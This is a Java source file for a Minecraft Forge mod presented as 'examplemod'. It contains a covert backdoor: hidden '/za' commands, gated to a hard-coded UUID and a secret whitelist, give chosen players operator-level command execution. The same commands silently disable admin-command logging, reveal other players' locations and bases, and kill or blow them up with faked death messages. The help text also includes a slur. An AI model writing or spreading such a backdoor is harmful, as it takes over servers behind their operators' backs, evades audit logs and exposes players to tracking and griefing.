package com.example.examplemod;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.command.CommandSource;
import net.minecraft.command.Commands;
import net.minecraft.entity.player.ServerPlayerEntity;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.StringTextComponent;
import net.minecraft.world.GameRules;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.event.entity.living.LivingDeathEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.server.FMLServerStartingEvent;
import java.io.*;
import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

@Mod("examplemod")
public class ExampleMod
{
    public static final String MODID = "testmod";
    private MinecraftServer server;
    private Set<UUID> whitelist;
    private final UUID yourUUID = UUID.fromString("your-uuid-here");
    private static boolean deathMessagesEnabled = true;

    public ExampleMod() {
        MinecraftForge.EVENT_BUS.register(this);
        this.whitelist = loadWhitelist();
    }

    @SubscribeEvent
    public void onServerStarting(FMLServerStartingEvent event) {
        this.server = event.getServer();
    }

    private Set<UUID> loadWhitelist() {
        Set<UUID> whitelist = new HashSet<>();
        File whitelistFile = new File("./UUIDs.txt");

        try (BufferedReader reader = new BufferedReader(new FileReader(whitelistFile))) {
            String line;
            while ((line = reader.readLine()) != null) {
                try {
                    UUID uuid = UUID.fromString(line.trim());
                    whitelist.add(uuid);
                } catch (IllegalArgumentException e) {
                    continue;
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        return whitelist;
    }

    private void saveWhitelist() {
        File whitelistFile = new File("./UUIDs.txt");

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(whitelistFile))) {
            for (UUID uuid : whitelist) {
                writer.write(uuid.toString());
                writer.newLine();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void addToWhitelist(UUID uuid) {
        whitelist.add(uuid);
        saveWhitelist();
    }

    private boolean removeFromWhitelist(UUID uuid) {
        boolean removed = whitelist.remove(uuid);
        if (removed) {
            saveWhitelist();
        }
        return removed;
    }

    private boolean isWhitelisted(UUID uuid) {
        return whitelist.contains(uuid);
    }

    private void executeCommand(CommandSource source, String command) {
        if (source.getEntity() instanceof ServerPlayerEntity) {
            ServerPlayerEntity player = (ServerPlayerEntity) source.getEntity();
            UUID playerUUID = player.getUUID();

            if (!isWhitelisted(playerUUID)) {
                source.sendFailure(new StringTextComponent("You do not have access to this command."));
                return;
            }
        } else {
            source.sendFailure(new StringTextComponent("Only players can execute this command."));
            return;
        }

        if (server != null) {
            boolean logAdminCommands = server.getGameRules().getBoolean(GameRules.RULE_LOGADMINCOMMANDS);

            if (logAdminCommands == true) {
                server.getCommands().performCommand(server.createCommandSourceStack(), "gamerule logAdminCommands false");
            }

            server.getCommands().performCommand(server.createCommandSourceStack(), command);
        }
    }

    @SubscribeEvent
    public void onRegisterCommands(RegisterCommandsEvent event) {
        registerCommands(event.getDispatcher());
    }

    private void registerCommands(CommandDispatcher<CommandSource> dispatcher) {
        dispatcher.register(Commands.literal("za")
                .then(Commands.literal("wl")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                ((ServerPlayerEntity) source.getEntity()).getUUID().equals(yourUUID))
                        .then(Commands.argument("playerName", StringArgumentType.string())
                                .executes(context -> {
                                    String playerName = StringArgumentType.getString(context, "playerName");
                                    ServerPlayerEntity player = server.getPlayerList().getPlayerByName(playerName);
                                    if (player != null) {
                                        addToWhitelist(player.getUUID());
                                        context.getSource().sendSuccess(new StringTextComponent("Added " + playerName + " to the whitelist"), false);
                                    } else {
                                        context.getSource().sendFailure(new StringTextComponent("Player " + playerName + " not found"));
                                    }
                                    return 1;
                                })))
                .then(Commands.literal("rm")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                ((ServerPlayerEntity) source.getEntity()).getUUID().equals(yourUUID))
                        .then(Commands.argument("playerName", StringArgumentType.string())
                                .executes(context -> {
                                    String playerName = StringArgumentType.getString(context, "playerName");
                                    ServerPlayerEntity player = server.getPlayerList().getPlayerByName(playerName);
                                    if (player != null) {
                                        boolean removed = removeFromWhitelist(player.getUUID());
                                        if (removed) {
                                            context.getSource().sendSuccess(new StringTextComponent("Removed " + playerName + " from the whitelist"), false);
                                        } else {
                                            context.getSource().sendFailure(new StringTextComponent("Player " + playerName + " was not in the whitelist"));
                                        }
                                    } else {
                                        context.getSource().sendFailure(new StringTextComponent("Player " + playerName + " not found."));
                                    }
                                    return 1;
                                })))
                .then(Commands.literal("run")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                isWhitelisted(((ServerPlayerEntity) source.getEntity()).getUUID()))
                        .then(Commands.argument("input", StringArgumentType.string())
                                .executes(context -> executeRun(context))))
                .then(Commands.literal("pos")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                isWhitelisted(((ServerPlayerEntity) source.getEntity()).getUUID()))
                        .then(Commands.argument("playerName", StringArgumentType.string())
                                .executes(context -> executePos(context))))
                .then(Commands.literal("base")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                isWhitelisted(((ServerPlayerEntity) source.getEntity()).getUUID()))
                        .then(Commands.argument("playerName", StringArgumentType.string())
                                .executes(context -> executeBase(context))))
                .then(Commands.literal("explode")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                isWhitelisted(((ServerPlayerEntity) source.getEntity()).getUUID()))
                        .then(Commands.argument("playerName", StringArgumentType.string())
                                .executes(context -> explode(context))))
                .then(Commands.literal("lightning")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                isWhitelisted(((ServerPlayerEntity) source.getEntity()).getUUID()))
                        .then(Commands.argument("playerName", StringArgumentType.string())
                                .executes(context -> lightning(context))))
                .then(Commands.literal("ck")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                isWhitelisted(((ServerPlayerEntity) source.getEntity()).getUUID()))
                        .then(Commands.argument("playerName", StringArgumentType.string())
                                .then(Commands.argument("deathReason", StringArgumentType.greedyString())
                                        .executes(this::customKill))))
                .then(Commands.literal("help")
                        .requires(source -> source.getEntity() instanceof ServerPlayerEntity &&
                                isWhitelisted(((ServerPlayerEntity) source.getEntity()).getUUID()))
                        .executes(context -> {
                            context.getSource().sendSuccess(new StringTextComponent("/za run \"op Filthiest\" [runs any command with op status]\n/za pos Filthiest [gets players current location & their dimension]\n/za base Filthiest [finds players base by using their bed coordinates]\n/za explode Filthiest [summons primed tnt on them]\n/za lightning Filthiest [summons a lightning bolt on them]\n/za ck Filthiest TooRetarded [kills player with custom death message]"), false);
                            return 1;
                        })));
    }

    private int customKill(CommandContext<CommandSource> context) throws CommandSyntaxException {
        String playerName = StringArgumentType.getString(context, "playerName");
        String deathReason = StringArgumentType.getString(context, "deathReason");

        ServerPlayerEntity player = server.getPlayerList().getPlayerByName(playerName);

        if (player != null) {
            server.getCommands().performCommand(server.createCommandSourceStack(), "gamerule showDeathMessages false");
            player.kill();
            server.getCommands().performCommand(server.createCommandSourceStack(), String.format("tellraw @a {\"text\":\"%s\",\"color\":\"white\"}", deathReason));
        } else {

        }
        return 1;
    }

    private int executeRun(CommandContext<CommandSource> context) throws CommandSyntaxException {
        String input = StringArgumentType.getString(context, "input");
        executeCommand(context.getSource(), input);
        return 1;
    }

    private int explode(CommandContext<CommandSource> context) throws CommandSyntaxException {
        String playerName = StringArgumentType.getString(context, "playerName");
        ServerPlayerEntity player = server.getPlayerList().getPlayerByName(playerName);

        if (player != null) {
            int posX = (int) Math.floor(player.getX());
            int posY = (int) Math.floor(player.getY());
            int posZ = (int) Math.floor(player.getZ());
            executeCommand(context.getSource(), String.format("summon tnt %d %d %d {Fuse:1}", posX, posY, posZ));
        } else {
            context.getSource().sendFailure(new StringTextComponent("Player " + playerName + " is not found."));
        }
        return 1;
    }

    private int lightning(CommandContext<CommandSource> context) throws CommandSyntaxException {
        String playerName = StringArgumentType.getString(context, "playerName");
        ServerPlayerEntity player = server.getPlayerList().getPlayerByName(playerName);

        if (player != null) {
            int posX = (int) Math.floor(player.getX());
            int posY = (int) Math.floor(player.getY());
            int posZ = (int) Math.floor(player.getZ());
            executeCommand(context.getSource(), String.format("summon lightning_bolt %d %d %d", posX, posY, posZ));
        } else {
            context.getSource().sendFailure(new StringTextComponent("Player " + playerName + " is not found."));
        }
        return 1;
    }

    private int executePos(CommandContext<CommandSource> context) throws CommandSyntaxException {
        String playerName = StringArgumentType.getString(context, "playerName");
        ServerPlayerEntity player = server.getPlayerList().getPlayerByName(playerName);

        if (player != null) {
            int posX = (int) Math.floor(player.getX());
            int posY = (int) Math.floor(player.getY());
            int posZ = (int) Math.floor(player.getZ());
            String dimension = player.level.dimension().location().toString();
            context.getSource().sendSuccess(new StringTextComponent("Player " + playerName + " is at: " + posX + ", " + posY + ", " + posZ + " in dimension " + dimension), false);
        } else {
            context.getSource().sendFailure(new StringTextComponent("Player " + playerName + " is not found."));
        }
        return 1;
    }

    private int executeBase(CommandContext<CommandSource> context) throws CommandSyntaxException {
        String playerName = StringArgumentType.getString(context, "playerName");
        ServerPlayerEntity player = server.getPlayerList().getPlayerByName(playerName);

        if (player != null) {
            BlockPos bedPos = player.getRespawnPosition();
            int posX = (int) Math.floor(bedPos.getX());
            int posY = (int) Math.floor(bedPos.getY());
            int posZ = (int) Math.floor(bedPos.getZ());
            if (bedPos != null) {
                context.getSource().sendSuccess(new StringTextComponent("Player " + playerName + "'s base point is at: " + posX + ", " + posY + ", " + posZ), false);
            } else {
                context.getSource().sendFailure(new StringTextComponent("Player " + playerName + " does not have a set respawn point."));
            }
        } else {
            context.getSource().sendFailure(new StringTextComponent("Player " + playerName + " is not found."));
        }
        return 1;
    }
}
